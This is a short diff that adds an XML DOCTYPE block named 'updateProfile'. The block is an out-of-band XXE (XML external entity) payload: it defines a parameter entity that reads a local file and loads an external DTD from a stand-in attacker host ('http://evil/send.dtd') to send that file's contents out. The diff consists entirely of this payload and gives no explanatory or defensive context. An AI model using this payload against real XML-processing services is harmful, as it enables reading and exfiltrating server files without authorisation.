@@ -1,0 +1,6 @@
+<!DOCTYPE updateProfile [
+ <!ENTITY % file SYSTEM "file:///path/to/goodies">
+ <!ENTITY % dtd SYSTEM "http://evil/send.dtd">
+%dtd;
+%send;
+]]>
